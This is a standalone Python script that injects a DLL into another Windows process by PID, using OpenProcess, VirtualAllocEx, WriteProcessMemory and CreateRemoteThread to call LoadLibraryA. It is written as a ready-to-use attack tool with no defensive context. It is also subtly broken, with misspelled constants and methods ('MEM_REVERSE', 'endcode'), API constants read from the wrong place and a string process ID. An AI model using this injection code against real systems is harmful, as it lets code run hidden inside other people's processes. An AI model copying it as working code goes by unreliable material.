import ctypes 
#take the dll_path and the PID of the target  
process_ID = " "
dll_path = " "

def dll_injection(process_ID, dll_path): 
    # use LoadLibrayA to load the DLL 
    dll_handle = ctypes.windll.kernel32.LoadLibrary(dll_path)
    #check 
    if not dll_handle: 
        print("Can not load the DLL")
        return False 
    #Open the process
    process_handle = ctypes.windll.kernel32.OpenProcess(
        ctypes.windll.kernel32.PROCESS_ALL_ACCESS,
        False,
        process_ID
    )
    #check
    if not process_handle: 
        print("Can not open the process")
        return False 
    
    #Get the address of LoadLibraryA in the process 
    kernel32 = ctypes.windll.kernel32
    load_library_address = kernel32.GetProcAddress(kernel32.GetModuleHandleA("kernel32.dll"), b"LoadLibraryA")
    
    #Create space in the process to store the DLL
    dll_path_address = kernel32.VirtualAllocEx(
        process_handle,
        0,
        len(dll_path),
        kernel32.MEM_COMMIT | kernel32.MEM_REVERSE, 
        kernel32.PAGE_READWRITE 
    )
    #check 
    if not dll_path_address: 
        print("Can not create space")
        return False 
    #write the DLL ath into the process memory 
    written = ctypes.c_ulong(0)
    kernel32.WriteProcessMemory(process_handle, dll_path_address, dll_path.endcode("utf-8"), 
                                len(dll_path), ctypes.byref(written))
    
    #Create a new thread in the process and run the LoadLibraryA with DLL path 
    thread_id = kernel32.CreateRemoteThread(
        process_handle,
        None, 
        0,
        load_library_address,
        dll_path_address, 
        0, 
        ctypes.byref(ctypes.c_ulong(0))
    )
    #check
    if not thread_id: 
        print("Can not create thread in the process")
        return False
    #Done 
    return True 
# Inject
if(dll_injection(process_ID, dll_path)): 
    print("SUCCESSFULLY injected")
else: 
    print("FAILED")

        
